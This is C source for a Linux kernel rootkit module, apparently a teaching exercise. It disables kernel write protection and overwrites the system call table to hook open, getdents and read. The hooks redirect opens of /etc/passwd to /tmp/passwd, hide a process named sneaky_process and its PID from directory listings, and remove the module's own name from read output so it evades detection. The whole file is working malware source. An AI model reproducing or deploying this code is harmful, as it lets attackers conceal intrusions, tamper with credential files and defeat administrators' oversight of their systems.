#include <linux/module.h> // for all modules
#include <linux/init.h>    // for entry/exit macros
#include <linux/kernel.h> // for printk and other kernel bits
#include <asm/current.h> // process information
#include <asm/cacheflush.h>
#include <asm/page.h>
#include <linux/highmem.h> // for changing page permissions
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <asm/unistd.h>    // for system call constants

MODULE_LICENSE("GPL");

static char* pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "process id of sneaky_process");

struct linux_dirent
{
  long d_ino;
  off_t d_off;
  unsigned short d_reclen;
  char d_name[];
};

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073190;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00280;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_open)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n");
  if (strcmp(pathname, "/etc/passwd") == 0)
  {
    copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
  }
  return original_open(pathname, flags);
}

//Define our new sneaky version of the 'getdents' syscall
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{ 
  int bpos = 0;
  struct linux_dirent *d;
  long ret = original_getdents(fd, dirp, count);
  if (ret == -1) {
    return ret;
  }
  while(bpos < ret)
  {
    d = (void*)dirp +bpos;
    //match, skip it
    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid) == 0)
    {
      //skip the current linux_dirent
      memmove(d, (void*)d+d->d_reclen, (void*)dirp + ret - (void*)d - d->d_reclen);
      ret -= d->d_reclen;
      continue;
    }
    //not match, go to the next linux_dirent
    bpos += d->d_reclen;
  }
  return ret;
}

//Define our new sneaky version of the 'read' syscall
asmlinkage ssize_t sneaky_sys_read(int fd, void* buf, ssize_t count) {
  void *head;
  ssize_t ret = original_read(fd ,buf, count);
  if (ret <= 0) {
    return ret;
  }
  head = strnstr(buf, "sneaky_mod", ret);
  if (head != NULL) {
    size_t remaining_length = ret - (head - buf);
    void *tail = strnstr(head, "\n", remaining_length);
    if (tail != NULL) {
      size_t target_length;
      //tail points to the all the following chars behind \n
      tail += 1;
      target_length = tail - head;
      //remaining_length - target_length = new remaining_length
      memmove(head, tail, remaining_length - target_length);
      ret -= target_length;
    }
  }
  return ret;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_open = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_getdents = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  original_read = (void *)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void)
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_open;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading


